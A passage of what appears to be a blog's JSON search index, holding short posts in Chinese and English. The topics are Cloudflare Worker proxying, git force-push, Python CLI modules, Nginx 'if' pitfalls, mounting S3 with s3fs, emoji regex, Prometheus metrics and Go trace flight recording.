style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eRequest\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e Promise {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#75715e\"\u003e/**\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\t\t * Replace `remote` with the host you wish to send requests to\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\t\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eremote\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://example.com\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eawait\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efetch\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eremote\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e};\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Cloudflare"],"title":"隐藏于 Cloudflare 的全球网络之中"},{"categories":["Git","URL","push"],"contents":" https://www.jvt.me/posts/2021/10/23/undo-force-push/ https://www.jvt.me/posts/2018/09/18/safely-force-git-push/ git push --force-with-lease ","date":"July 26, 2024","hero":"/images/hero/git.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240726-git/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.jvt.me/posts/2021/10/23/undo-force-push/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.jvt.me/posts/2021/10/23/undo-force-push/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.jvt.me/posts/2018/09/18/safely-force-git-push/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.jvt.me/posts/2018/09/18/safely-force-git-push/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit push --force-with-lease\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Git","URL","push"],"title":"Git force push"},{"categories":["URL","Go"],"contents":" 以 Go 為例，圖解 Data Alignment 如何影響記憶體使用量 ","date":"July 8, 2024","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240708-illustrate-how-data-alignment-affects-memory-usage-d29bf9d5bf08/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/starbugs/illustrate-how-data-alignment-affects-memory-usage-d29bf9d5bf08\" target=\"_blank\" rel=\"noopener\"\u003e以 Go 為例，圖解 Data Alignment 如何影響記憶體使用量\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go"],"title":"以 Go 為例，圖解 Data Alignment 如何影響記憶體使用量"},{"categories":["URL","Go"],"contents":" The One Billion Row Challenge in Go: from 1m45s to 3.4s in nine solutions ","date":"July 8, 2024","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240708-go-1brc/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://benhoyt.com/writings/go-1brc/\" target=\"_blank\" rel=\"noopener\"\u003eThe One Billion Row Challenge in Go: from 1m45s to 3.4s in nine solutions\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go"],"title":"The One Billion Row Challenge in Go: from 1m45s to 3.4s in nine solutions"},{"categories":["URL","Python"],"contents":" Python\u0026rsquo;s many command-line utilities These are Python\u0026rsquo;s most helpful general-purpose command-line tools.\nCommand Purpose More python -m http.server Start a simple web server Video python -m webbrowser Launch your web browser Docs python -m json.tool Nicely format JSON data Docs python -m calendar Show a command-line calendar Docs http.server Running the http.server module as a script will start a web server on port 8000 that hosts files from the current directory. I use this all the time to preview Sphinx documentation sites (especially when using Sphinx\u0026rsquo;s dirhtml option which is all about subdirectories of index.html files).\n$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... webbrowser Running the webbrowser module as a script will open a given URL in your default web browser. For example, this would open the page https://pseudorandom.name:\n$ python -m webbrowser pseudorandom.name json.tool Python\u0026rsquo;s json.tool module can be run as a script to parse a JSON document and print out a version that\u0026rsquo;s formatted nicely for human readability.\n$ python -m json.tool /home/trey/Downloads/download.json [ { \u0026#34;title\u0026#34;: \u0026#34;Python\u0026#39;s walrus operator\u0026#34;, \u0026#34;is_premium\u0026#34;: false, \u0026#34;url\u0026#34;: \u0026#34;/using-walrus-operator/\u0026#34; }, { \u0026#34;title\u0026#34;: \u0026#34;Refactoring long boolean expressions\u0026#34;, \u0026#34;is_premium\u0026#34;: true, \u0026#34;url\u0026#34;: \u0026#34;/refactoring-boolean-expressions/\u0026#34; } ] calendar Running the calendar module as a script will print a calendar of the current year by default. It also accepts various arguments to customize its output. Here\u0026rsquo;s a calendar of just one month:\n$ python -m calendar 2024 04 April 2024 Mo Tu We Th Fr Sa Su 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 Those 4 scripts are general-purpose tools that I find helpful on any machine. Python also includes a number of tools that are commonly available (or easily installable) on Linux and Mac machines.\nEspecially handy on Windows machines Running Python on Windows? Or running Python on a Linux/Mac machine without the ability to easily install common command-line utilities like uuid, sqlite3 and gzip?\nThese tools are all equivalent to command-line tools that are common on many Linux machines, though the equivalent Linux commands are usually more powerful and more user-friendly.\nCommand Purpose More python3.12 -m uuid Like uuidgen CLI utility Docs python3.12 -m sqlite3 Like sqlite3 CLI utility Docs python -m zipfile Like zip \u0026amp; unzip CLI utilities Docs python -m gzip Like gzip \u0026amp; gunzip CLI utilities Docs python -m tarfile Like the tar CLI utility Docs python -m base64 Like the base64 CLI utility python -m ftplib Like the ftp utility python -m smtplib Like the sendmail utility python -m poplib Like using curl to read email python -m imaplib Like using curl to read email python -m telnetlib Like the telnetutility Analyzing Python code Python also includes a handful of other Python-related tools that are specifically for analyzing Python code.\nIf you wanted to analyze some Python code to see how it ticks, these tools can be useful.\nCommand Purpose More python -m tokenize Break Python module into \u0026ldquo;tokens\u0026rdquo; Docs python -m ast Show abstract syntax tree for code Docs python -m dis Disassemble Python code to bytecode Docs python -m inspect inspect source code of a Python object Docs python -m pyclbr See overview of a module\u0026rsquo;s objects Just for fun These are Python Easter Eggs that work as Python scripts.\nCommand Purpose python -m __hello__ Print Hello world! python -m this Display the Zen of Python (PEP 20) python -m antigravity Open XKCD 353 in a web browser python -m turtledemo See turtle module demos ","date":"July 6, 2024","hero":"/images/hero/python.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240706-cli-tools/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.pythonmorsels.com/cli-tools/\" target=\"_blank\" rel=\"noopener\"\u003ePython\u0026rsquo;s many command-line utilities\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThese are Python\u0026rsquo;s most helpful general-purpose command-line tools.\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eCommand\u003c/th\u003e\n          \u003cth\u003ePurpose\u003c/th\u003e\n          \u003cth\u003eMore\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003epython -m http.server\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eStart a simple web server\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://www.pythonmorsels.com/http-server/\" target=\"_blank\" rel=\"noopener\"\u003eVideo\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003epython -m webbrowser\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eLaunch your web browser\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://docs.python.org/3/library/webbrowser.html#command-line-interface\" target=\"_blank\" rel=\"noopener\"\u003eDocs\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003epython -m json.tool\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eNicely format JSON data\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://docs.python.org/3/library/json.html#module-json.tool\" target=\"_blank\" rel=\"noopener\"\u003eDocs\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003epython -m calendar\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eShow a command-line calendar\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://docs.python.org/3/library/calendar.html#command-line-usage\" target=\"_blank\" rel=\"noopener\"\u003eDocs\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"httpserver\"\u003e\u003ccode\u003ehttp.server\u003c/code\u003e\u003c/h3\u003e\n\u003cp\u003eRunning the \u003ccode\u003ehttp.server\u003c/code\u003e module as a script will start a web server on port 8000 that hosts files from the current directory. I use this \u003cem\u003eall the time\u003c/em\u003e to preview Sphinx documentation sites (especially when using Sphinx\u0026rsquo;s \u003ccode\u003edirhtml\u003c/code\u003e option which is \u003cem\u003eall about\u003c/em\u003e subdirectories of \u003ccode\u003eindex.html\u003c/code\u003e files).\u003c/p\u003e","tags":["URL","Python"],"title":"Python's many command-line utilities"},{"categories":["golang","URL","leetcode"],"contents":" https://books.halfrost.com/leetcode/ ","date":"June 20, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240620-leetcode/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://books.halfrost.com/leetcode/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://books.halfrost.com/leetcode/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["golang","URL","leetcode"],"title":"Go leetcode"},{"categories":["URL","Nginx"],"contents":" Nginx if 避坑指南 If is Evil\u0026hellip; when used in location context if 指令由 rewrite 模块提供，显然它主要是用于 URL 重写领域。典型的 if 用法如下：\nhttp { server { listen 8080; if ($http_user_agent ~ MSIE) { rewrite ^(.*)$ /msie/$1 break; } if ($request_method = POST) { return 405; } } } 上例中第一个 if 检查如果 user agent 字符串中包含 MSIE，就把 URL 重写为 /msie 开头的路径，这样就可以给微软的 IE 浏览器提供特供版本内容。\n第二个 if 检查当前请求的 HTTP 方法，如果是 POST 请求则直接返回 405 状态码。\n以上就是 if 最典型的用法，也是 Nginx 最初设想的用法～但很快就被用户玩坏了 😂\n天下苦静态配置久矣，Nginx 终于支持动态配置了 👏 这个 if 不就是 c 语言里的条件判断吗？大家玩起来 🎢\n咱们先来个条件限速吧。如果请求参数 id 的值为 124 就限速 1k ～\nlocation /api { if ($args ~ id=124) { limit_rate 1k; } } So far so good😄 能不能再来点复杂的呢？比如下面这个：\nlocation /only-one-if { set $true 1; if ($true) { add_header X-First 1; } if ($true) { add_header X-Second 2; } return 204; } 从配置上看，先设置了变量 $true 然后是两个 if 判断，如果 $true 不为零就各添加一个头字段～逻辑很清晰嘛 ☺️\n但是实际运行就会发现，请求 /only-one-if 时的响应中只包含 X-Second 这个头字段。这就开始出现问题了。这是为什么呢？\n简单来说每一个 if 判断都可以看成是一个特殊的 location 块。在 Nginx 中，所有的模块都会为每个 location 分配单独的内存来保存该模块对于当前 location 的特定配置信息。 Nginx 在处理请求的时候，会根据实际的路径来动态确定使用哪个配置。\n在上面的例子中，因为两个 if 条件都满足，所以后一个 if 的 location 配置会覆盖前一个，自然就只有 add_header X-Second 2 生效了。\n基于同样的原理，就可以解释以下诡异的行为。\n发给上游的请求路径不会被改写成 /\nlocation /proxy-pass-uri { proxy_pass http://127.0.0.1:8080/; set $true 1; if ($true) { # nothing } } try_files 失效\nlocation /if-try-files { try_files /file @fallback; set $true 1; if ($true) { # nothing } } nginx 工作进程报 SIGSEGV 退出\nlocation /crash { set $true 1; if ($true) { # fastcgi_pass here fastcgi_pass 127.0.0.1:9000; } if ($true) { # no handler here } } if 块中创建的 location 块无法读取上面捕获的 $file 变量\nlocation ~* ^/if-and-alias/(?\u0026lt;file\u0026gt;.*) { alias /tmp/$file; set $true 1; if ($true) { # nothing } } 以上种种问题都源于 if 对应的 block 配置没有继承所有的上级 location 配置信息。但像是 proxy_pass/try_files 这种模块又依赖这些信息，所以就会出现各种诡异的行为，甚至进程还会崩溃 😂\n那怎样才能避免这类问题呢？上面的几个问题虽然跟 if 有关，但行为却各不相同。归根结底是因为不同的模块依赖不同的 location 配置，有的被 if 继承了，有的没继承，所以最终会产生什么结果谁也不知道。但有一点很明确，就是跟 rewrite 相关的配置肯定是没有问题的。所以说，要想避免问题，我们只能在 if 块中使用 return 和 rewrite，而且 rewrite 还得加上 last 参数。其他配置都有可能出现问题。\n再一个就是避免在 if 中定义新的 location。可以使用 return + error_page 来实现跳转：\nlocation / { error_page 418 = @other; recursive_error_pages on; if ($something) { return 418; } # some configuration } location @other { return 200 error; } ","date":"June 15, 2024","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240615-if-is-evil/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://taoshu.in/nginx/if-is-evil.html\" target=\"_blank\" rel=\"noopener\"\u003eNginx if 避坑指南\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://archive.ph/hyEoc\" target=\"_blank\" rel=\"noopener\"\u003eIf is Evil\u0026hellip; when used in location context\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eif 指令由 rewrite 模块提供，显然它主要是用于 URL 重写领域。典型的 if 用法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8080\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e(\u003c/span\u003e$http_user_agent ~ \u003cspan style=\"color:#e6db74\"\u003eMSIE)\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003erewrite\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e^(.*)\u003c/span\u003e$ \u003cspan style=\"color:#e6db74\"\u003e/msie/\u003c/span\u003e$1 \u003cspan style=\"color:#e6db74\"\u003ebreak\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e(\u003c/span\u003e$request_method = \u003cspan style=\"color:#e6db74\"\u003ePOST)\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e405\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上例中第一个 if 检查如果 user agent 字符串中包含 MSIE，就把 URL 重写为 /msie 开头的路径，这样就可以给微软的 IE 浏览器提供特供版本内容。\u003c/p\u003e\n\u003cp\u003e第二个 if 检查当前请求的 HTTP 方法，如果是 POST 请求则直接返回 405 状态码。\u003c/p\u003e\n\u003cp\u003e以上就是 if 最典型的用法，也是 Nginx 最初设想的用法～但很快就被用户玩坏了 😂\u003c/p\u003e\n\u003cp\u003e天下苦静态配置久矣，Nginx 终于支持动态配置了 👏 这个 if 不就是 c 语言里的条件判断吗？大家玩起来 🎢\u003c/p\u003e","tags":["URL","Nginx"],"title":"Nginx if 避坑指南"},{"categories":["URL","AWS","S3"],"contents":" Mount AWS S3 Bucket On Amazon EC2 Use Cases\nData Backup and Archiving: Efficiently store and retrieve data from S3 to perform reliable backups and long-term archiving. Big Data and Analytics: Directly access large datasets in S3 for seamless data processing and analytics. Web Hosting and Content Distribution: Serve static content from S3 to host websites and media files efficiently. Log Collection and Analysis: Centrally store logs in S3 for easy log analysis and monitoring. File Sharing and Collaboration: Share and collaborate on files among multiple EC2 instances using S3 as a shared data repository. Prerequisites\nAn Amazon EC2 instance running Linux (Amazon Linux, Ubuntu, CentOS, etc.). IAM role attached to the EC2 instance with appropriate permissions to access the S3 bucket. sudo apt-get update -y sudo apt-get install awscli -y sudo apt-get install s3fs -y # Create a mount point directory for the S3 bucke sudo mkdir /mnt/s3-bucket # sync the local directory with the S3 bucket to check the access cd /mnt/s3-bucket ;touch test1.txt test2.txt aws s3 sync /mnt/s3-bucket s3://\u0026lt;your-s3-bucket-name\u0026gt; # mount the S3 bucket as a filesystem sudo s3fs \u0026lt;your-s3-bucket-name\u0026gt; /mnt/s3-bucket -o iam_role=\u0026lt;iam-role-name\u0026gt; -o use_cache=/tmp -o allow_other -o uid=1001 -o mp_umask=002 -o multireq_max=5 -o use_path_request_style -o url=https://s3-{{aws_region}}.amazonaws.com Debug issue To debug at any point, add\n$ sudo s3fs \u0026lt;your-s3-bucket-name\u0026gt; /mnt/s3-bucket -o iam_role=\u0026lt;iam-role-name\u0026gt; -o use_cache=/tmp -o allow_other -o uid=1001 -o mp_umask=002 -o multireq_max=5 -o use_path_request_style -o url=https://s3-{{aws_region}}.amazonaws.com -o dbglevel=info -f -o curldbg Verify the mount status\ndf -h | grep s3fs To make the S3 bucket mount persistent across reboots\n/etc/fstab\ns3fs#\u0026lt;your-s3-bucket-name\u0026gt; /mnt/s3-bucket fuse _netdev,iam_role=\u0026lt;iam-role-name\u0026gt;,allow_other 0 0 ","date":"June 9, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240609-mount-aws-s3-bucket-on-amazon-ec2-9f18b48d4f04/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://surajblog.medium.com/mount-aws-s3-bucket-on-amazon-ec2-9f18b48d4f04\" target=\"_blank\" rel=\"noopener\"\u003eMount AWS S3 Bucket On Amazon EC2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eUse Cases\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eData Backup and Archiving: Efficiently store and retrieve data from S3 to perform reliable backups and long-term archiving.\u003c/li\u003e\n\u003cli\u003eBig Data and Analytics: Directly access large datasets in S3 for seamless data processing and analytics.\u003c/li\u003e\n\u003cli\u003eWeb Hosting and Content Distribution: Serve static content from S3 to host websites and media files efficiently.\u003c/li\u003e\n\u003cli\u003eLog Collection and Analysis: Centrally store logs in S3 for easy log analysis and monitoring.\u003c/li\u003e\n\u003cli\u003eFile Sharing and Collaboration: Share and collaborate on files among multiple EC2 instances using S3 as a shared data repository.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003ePrerequisites\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e","tags":["URL","AWS","S3"],"title":"Mount AWS S3 Bucket On Amazon EC2"},{"categories":["URL","Cloudflare"],"contents":" WebP Cloud 使用 Cloudflare Workers 回源以保护回源服务器并开始提供回源时间信息 ","date":"June 9, 2024","hero":"/images/hero/cloudflare.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240609-cloudflare-workers-origin/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.webp.se/cloudflare-workers-origin-zh/\" target=\"_blank\" rel=\"noopener\"\u003eWebP Cloud 使用 Cloudflare Workers 回源以保护回源服务器并开始提供回源时间信息\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Cloudflare"],"title":"WebP Cloud 使用 Cloudflare Workers 回源以保护回源服务器并开始提供回源时间信息"},{"categories":["regex","URL","emoji"],"contents":" Emoji 正则匹配 /\\p{Emoji}/u\n既然是匹配 Emoji，那么 loneProperty (\\p{loneProperty}) 就应该是 Emoji ? 实际测试并不符合需求，因为在 Emoji 官方文档中， 123456789*# 也是被看作是 Emoji， 如果用这个正则的话，就会把数字也认为是 Emoji，不符合只排除特殊表情的要求。\n/\\p{Extended_Pictographic}/u\n而 Extended_Pictographic 表示的 Emoji 才是我们认为的那些表情符号。\n","date":"May 19, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240519-emoji-regexp/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://taxodium.ink/post/emoji-regexp/\" target=\"_blank\" rel=\"noopener\"\u003eEmoji 正则匹配\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ccode\u003e/\\p{Emoji}/u\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e既然是匹配 Emoji，那么 loneProperty (\\p{loneProperty}) 就应该是 Emoji ? 实际测试并不符合需求，因为在 Emoji 官方文档中， 123456789*# 也是被看作是 Emoji， 如果用这个正则的话，就会把数字也认为是 Emoji，不符合只排除特殊表情的要求。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/\\p{Extended_Pictographic}/u\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e而 Extended_Pictographic 表示的 Emoji 才是我们认为的那些表情符号。\u003c/p\u003e","tags":["regex","URL","emoji"],"title":"Emoji 正则匹配"},{"categories":["Prometheus","URL"],"contents":" How to use relabeling in Prometheus and VictoriaMetrics Interpreting Prometheus metrics for Linux disk I/O utilization Prometheus 简介 Adding new label\n- target_label: \u0026#34;foo\u0026#34; replacement: \u0026#34;bar\u0026#34; metrics\nrkB/s: rate(node_disk_read_bytes_total[*]) Unit: bytes per second wkB/s: rate(node_disk_written_bytes_total[*]) Unit: bytes per second ","date":"May 14, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240514-prometheus/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://valyala.medium.com/how-to-use-relabeling-in-prometheus-and-victoriametrics-8b90fc22c4b2\" target=\"_blank\" rel=\"noopener\"\u003eHow to use relabeling in Prometheus and VictoriaMetrics\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://brian-candler.medium.com/interpreting-prometheus-metrics-for-linux-disk-i-o-utilization-4db53dfedcfc\" target=\"_blank\" rel=\"noopener\"\u003eInterpreting Prometheus metrics for Linux disk I/O utilization\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://tao.zz.ac/sre/prom.html\" target=\"_blank\" rel=\"noopener\"\u003ePrometheus 简介\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cem\u003eAdding new label\u003c/em\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003etarget_label\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;foo\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ereplacement\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bar\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cem\u003emetrics\u003c/em\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erkB/s:\n\u003ccode\u003erate(node_disk_read_bytes_total[*])\u003c/code\u003e\nUnit: bytes per second\u003c/li\u003e\n\u003cli\u003ewkB/s:\n\u003ccode\u003erate(node_disk_written_bytes_total[*])\u003c/code\u003e\nUnit: bytes per second\u003c/li\u003e\n\u003c/ul\u003e","tags":["Prometheus","URL"],"title":"Prometheus relabeling and linux metrics"},{"categories":["llm","machinelearning","URL"],"contents":" 大型語言模型 LLMs 課程教學 課程大綱 (四) 大型語言模型 LLMs 課程教學 課程大綱 (五) 大型語言模型 LLMs 課程教學 課程大綱 (六) LM STUDIO chromadb/chroma ollama/ollama mintplexlabs/anythingllm ","date":"May 10, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240510-llm/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://hackmd.io/@whYPD8MBSHWRZV6y-ymFwQ/ryqUCfu6T\" target=\"_blank\" rel=\"noopener\"\u003e大型語言模型 LLMs 課程教學 課程大綱 (四)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://hackmd.io/cZPGG0gQRCuG7pZGV-SlEg\" target=\"_blank\" rel=\"noopener\"\u003e大型語言模型 LLMs 課程教學 課程大綱 (五)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://hackmd.io/@whYPD8MBSHWRZV6y-ymFwQ/Bk3TbayAp\" target=\"_blank\" rel=\"noopener\"\u003e大型語言模型 LLMs 課程教學 課程大綱 (六)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eLM STUDIO\u003c/li\u003e\n\u003cli\u003echromadb/chroma\u003c/li\u003e\n\u003cli\u003eollama/ollama\u003c/li\u003e\n\u003cli\u003emintplexlabs/anythingllm\u003c/li\u003e\n\u003c/ol\u003e","tags":["llm","machinelearning","URL"],"title":"LLMs Hackmd Docs"},{"categories":["URL","Go","trace"],"contents":" 更强大的 Go 执行跟踪能力 runtime/trace golang.org/x/exp/trace 飞行记录(flight recording) // 设置飞行记录器 fr := trace.NewFlightRecorder() fr.Start() // 设置和运行HTTP服务器 var once sync.Once http.HandleFunc(\u0026#34;/my-endpoint\u0026#34;, func(w http.ResponseWriter, r *http.Request) { start := time.Now() // 干些事情 doWork(w, r) // 盼到了长耗时请求，来个快照 if time.Since(start) \u0026gt; 300*time.Millisecond { // 这里我们为了简化只做一次，实际上你可以做多次 once.Do(func() { // 抓取快照 var b bytes.Buffer _, err = fr.WriteTo(\u0026amp;b) if err != nil { log.Print(err) return } // 把快照写入文件 if err := os.WriteFile(\u0026#34;trace.out\u0026#34;, b.Bytes(), 0o755); err != nil { log.Print(err) return } }) } }) 